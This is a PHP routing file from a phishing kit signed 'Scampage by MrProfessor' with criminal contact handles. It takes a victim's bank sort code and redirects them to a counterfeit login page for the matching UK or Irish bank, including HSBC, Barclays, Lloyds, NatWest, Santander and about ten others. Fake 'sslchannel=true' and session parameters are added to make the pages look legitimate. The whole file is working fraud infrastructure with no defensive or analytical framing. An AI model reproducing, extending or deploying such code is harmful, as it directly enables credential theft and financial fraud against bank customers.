<?php
/*
* Scampage by MrProfessor
* Jabber: mrprofessor@jodo.im
* ICQ: C3AS3R
*/
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
error_reporting(0);


$hash = generateRandomString(130);
$sort_code = $_SESSION['sortcode'];
$source = array_map('trim', explode("\n", file_get_contents('codes/hsbc_codes.txt')));
$source4 = array_map('trim', explode("\n", file_get_contents('codes/cobank_codes.txt')));
$source5 = array_map('trim', explode("\n", file_get_contents('codes/halifax_codes.txt')));
$source6 = array_map('trim', explode("\n", file_get_contents('codes/lloyds_codes.txt')));
$source7 = array_map('trim', explode("\n", file_get_contents('codes/natwest_codes.txt')));
$source11 = array_map('trim', explode("\n", file_get_contents('codes/metro_codes.txt')));
$source12 = array_map('trim', explode("\n", file_get_contents('codes/santander_codes.txt')));
$source13 = array_map('trim', explode("\n", file_get_contents('codes/barclays_codes.txt')));
$source14 = array_map('trim', explode("\n", file_get_contents('codes/rbs_codes.txt')));
$source15 = array_map('trim', explode("\n", file_get_contents('codes/yorkshire.txt')));
$source16 = array_map('trim', explode("\n", file_get_contents('codes/tesco_codes.txt')));
$source17 = array_map('trim', explode("\n", file_get_contents('codes/citi_codes.txt')));
$source18 = array_map('trim', explode("\n", file_get_contents('codes/tsb_codes.txt')));
$source19 = array_map('trim', explode("\n", file_get_contents('codes/clydesdale_codes.txt')));
$source20 = array_map('trim', explode("\n", file_get_contents('codes/nationwide_codes.txt')));
$source21 = array_map('trim', explode("\n", file_get_contents('codes/boi_codes.txt')));




if (in_array($sort_code, $source))  {

$_SESSION['bank_name'] = "HSBC";
header("Location: banks/hsbc.co.uk/Login.php?&sessionid=$hash&securessl=true");
die();

}
elseif (in_array($sort_code, $source7))  {

    $_SESSION['bank_name'] = "Natwest";
    header("Location: banks/personal.natwest.com/index.php?sslchannel=true&sessionid=" . $hash);
    die();

}


elseif (in_array($sort_code, $source5))  {

$_SESSION['bank_name'] = "Halifax";
    header("Location: banks/halifax-online.co.uk/Login.php?sslchannel=true&sessionid=" . $hash);
    die();


}

elseif (in_array($sort_code, $source4))  {

    $_SESSION['bank_name'] = "Cooperative";
    header("Location: banks/personal.co-operativebank.co.uk/index.php?sslchannel=true&sessionid=" . $hash);
    die();

}

elseif (in_array($sort_code, $source6))  {

$_SESSION['bank_name'] = "Lloyds";
    header("Location: banks/online.lloydsbank.co.uk/index.php?sslchannel=true&sessionid=" . $hash);
die();

}


elseif (in_array($sort_code, $source11))  {

$_SESSION['bank_name'] = "Metro";
header("Location: banks/metrobankonline.co.uk/Login.php?sslchannel=true&sessionid=" . $hash);
die();

}
elseif (in_array($sort_code, $source12))  {

    $_SESSION['bank_name'] = "Santander";
    header("Location: banks/retail.santander.co.uk/index.php?sslchannel=true&sessionid=" . $hash);
    die();

}
elseif (in_array($sort_code, $source13))  {

    $_SESSION['bank_name'] = "Barclays";
    header("Location: banks/bank.barclays.co.uk/index.php?sslchannel=true&sessionid=" . $hash);
    die();

} elseif (in_array($sort_code, $source14))  {

    $_SESSION['bank_name'] = "RBS";
    header("Location: banks/rbsdigital.com/index.php?sslchannel=true&sessionid=" . $hash);
    die();

} elseif (in_array($sort_code, $source15))  {

    $_SESSION['bank_name'] = "Yorkshire";
    header("Location: banks/secure.ybonline.co.uk/Login.php?sslchannel=true&sessionid=" . $hash);
    die();

} elseif (in_array($sort_code, $source16))  {

    $_SESSION['bank_name'] = "Tesco";
    header("Location: banks/tescobank.com/Login.php?sslchannel=true&sessionid=" . $hash);
    die();

} elseif (in_array($sort_code, $source19))  {

        $_SESSION['bank_name'] = "Clydesdale";
        header("Location: banks/home.cbonline.co.uk/index.php?sslchannel=true&sessionid=" . $hash);
        die();

} elseif (in_array($sort_code, $source20))  {

      $_SESSION['bank_name'] = "Nationwide";
      header("Location: banks/nationwide.co.uk/index.php?sslchannel=true&sessionid=" . $hash);
      die();

} elseif (in_array($sort_code, $source18))  {

      $_SESSION['bank_name'] = "TSB";
      header("Location: banks/online.tsb.co.uk/Login.php?sslchannel=true&sessionid=" . $hash);
      die();

} elseif (in_array($sort_code, $source17))  {

    $_SESSION['bank_name'] = "CITI";
    header("Location: banks/online.citi.eu/Login.php?sslchannel=true&sessionid=" . $hash);
    die();
    
} elseif (in_array($sort_code, $source21))  {

    $_SESSION['bank_name'] = "BOI";
    header("Location: banks/365online.com/Login.php?sslchannel=true&sessionid=" . $hash);
    die();
}
 else {
    header('Location: Exit.php?sslchannel=true&sessionid=' . generateRandomString(130));
    exit;
}
